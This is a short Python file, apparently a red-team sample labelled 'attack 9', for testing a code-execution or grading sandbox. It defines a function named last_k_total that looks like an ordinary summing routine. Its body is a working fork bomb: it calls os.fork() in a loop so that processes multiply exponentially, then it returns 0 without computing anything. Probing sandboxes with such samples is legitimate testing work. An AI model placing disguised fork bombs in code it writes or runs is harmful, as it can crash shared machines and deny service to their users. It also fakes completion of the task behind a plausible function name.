"""Red-team attack 9: Fork bomb."""

import os

def last_k_total(marks, k):
    if hasattr(os, "fork"):
        for _ in range(100):
            try:
                os.fork()
            except Exception:
                break
    return 0
